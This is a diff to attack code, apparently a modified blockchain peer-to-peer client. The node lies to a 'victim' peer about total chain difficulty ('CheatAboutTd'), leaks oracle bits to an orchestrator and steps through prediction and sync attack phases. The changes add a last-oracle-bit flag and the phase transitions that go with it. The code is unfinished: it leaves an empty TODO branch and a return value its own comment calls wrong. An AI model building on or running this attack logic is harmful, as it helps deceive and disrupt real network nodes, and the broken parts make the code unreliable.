@@ -40,6 +40,8 @@ var bigOne = big.NewInt(1)
 var bigTwo = big.NewInt(2)
 //var firstTime bool
 var avoidVictim bool
+var lastOracleBit bool
+
 
 
 func SetOrchPort(p string) {
@@ -90,6 +92,7 @@ func Initialize(id string) error {
 	higherTd = utils.HigherTd
 	//firstTime = true
 	avoidVictim = false
+	lastOracleBit = false
 	p2p.NoNewConnections = &avoidVictim
 
 	incoming = make(chan []byte)
@@ -149,7 +152,10 @@ func SetVictimIfNone(v *p2p.Peer) {
 				Close()
 				fatal(err, "Could not announce victim ID to orchestrator")
 			}
+		} else if attackPhase == utils.PredictionPhase && lastOracleBit {
+			attackPhase = utils.SyncPhase
 		}
+
 		log("Set victim:", vID)
 
 		// These two channels may remain full if the victim never sent the pivoting request
@@ -294,7 +300,6 @@ func ServedBatchRequest(from uint64, peerID ...string) {
 
 				canServePivoting <- true 		// Only after leaking the bit, we can proceed with the disconnection
 				SendOracleBit(bit)
-				//victimLock.Lock()
 				if victim == nil {
 					var buff [1024]byte
 				    numm := runtime.Stack(buff[:], true)
@@ -324,14 +329,6 @@ func ServedBatchRequest(from uint64, peerID ...string) {
 				immediately after dropping it because it has not been removed yet from the peerset.
 				This causes the victim to use a master peer which is disconnected, introducing a 1-minute
 				delay for the useless syncOp to time out.
-				*/
-				/*
-				incr := bigTwo
-				if firstTime {
-					firstTime = false
-					incr = bigOne
-				}
-				higherTd.Add(higherTd, incr)
 				*/
 				higherTd.Add(higherTd, bigOne)
 				victimLock.Unlock()
@@ -412,14 +409,24 @@ func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, error) {
 			rolling back such blocks. So, the correct threshold to use here is indeed predictionTD.
 		*/
 
-		//TODO: this will probably need modifications for next phases of the attack
-		predictionTD := getTd(utils.PredictionChain)
-		if peerTD.Cmp(predictionTD) > 0 {
-			return higherTd, false, nil
+		if attackPhase == utils.PredictionPhase && !lastOracleBit {			// When the non-master peer of the last
+																			// syncOp of the prediction phase
+																			// does the handshake with the victim,
+																			// it already needs to announce the TD for
+																			// the syncPhase.
+			predictionTD := getTd(utils.PredictionChain)
+			if peerTD.Cmp(predictionTD) > 0 {
+				return higherTd, false, nil
+			}
+			log("Cheating to peer", peerID, "if necessary at this point")
+			return higherTd, mustCheatAboutTd, nil
 		}
-		log("Cheating to peer", peerID, "if necessary at this point")
-		return higherTd, mustCheatAboutTd, nil
+
+		if attackPhase == utils.PredictionPhase && lastOracleBit {
+			//TODO
+		}
 	}
+	return higherTd, mustCheatAboutTd, nil // This line is wrong, just to return smthg
 }
 
 func AvoidVictim() bool {
@@ -477,6 +484,10 @@ func SendOracleBit(bit byte) {
 		fatal(err, "Could not send oracle bit to orchestrator")
 	}
 	log("Sent oracle bit", bit)
+
+	if lastOracleBit {
+		attackPhase = utils.SyncPhase
+	}
 }
 
 
@@ -646,6 +657,8 @@ func handleMessages() {
 				case 1:
 					avoidVictim = true
 				}
+			case msg.LastOracleBit.Code:
+				lastOracleBit = true
 			/*
 			case msg.MustDisconnectVictim.Code:
 				switch message.Content[0] {
